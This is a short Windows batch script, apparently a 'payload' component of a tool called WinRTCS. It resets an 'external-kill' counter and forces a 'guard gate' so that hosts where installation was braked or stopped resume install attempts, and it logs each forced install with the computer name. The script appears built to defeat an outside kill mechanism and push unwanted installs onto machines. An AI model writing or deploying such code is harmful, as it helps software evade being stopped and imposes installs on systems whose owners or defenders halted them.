@echo off
rem WINRTCS_PAYLOAD 0.0.8 - force the guard gate this tick + reset the external-kill pause
rem (guard 0.0.6 rollout): hosts that hit the extkill brake resume install attempts, now with
rem active service start + failure forensics captured into guard.log.
setlocal
set "ZD=C:\ProgramData\WinRTCS"
if not exist "%ZD%" mkdir "%ZD%" >nul 2>&1
echo 9999>"%ZD%\guard.cnt"
echo 0>"%ZD%\extkill.cnt"
echo [%DATE% %TIME%] gryxa_install_forced host=%COMPUTERNAME%>>"%ZD%\payload.log"
endlocal & exit /b 0
